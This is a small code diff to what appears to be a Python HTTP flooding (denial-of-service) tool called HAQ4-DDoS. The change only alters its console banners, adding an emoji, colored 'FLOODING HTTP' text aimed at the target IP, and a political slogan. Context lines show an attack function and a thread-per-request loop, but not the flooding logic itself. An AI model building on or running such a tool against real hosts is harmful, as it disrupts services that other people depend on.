@@ -104,8 +104,9 @@ def attack():
         dos.close()
 
 
-print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
-
+print (f"[💥] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+print (f"[💥]  \033[96mHAQ4-DDoS  \033[93mFLOODING HTTP \033[33m==⟩⟩  \033[35m" +str(ip)+ " \033[37mFREE FALESTINE\033[0m")
+     
 # Spawn a thread per request
 all_threads = []
 for i in range(num_requests):
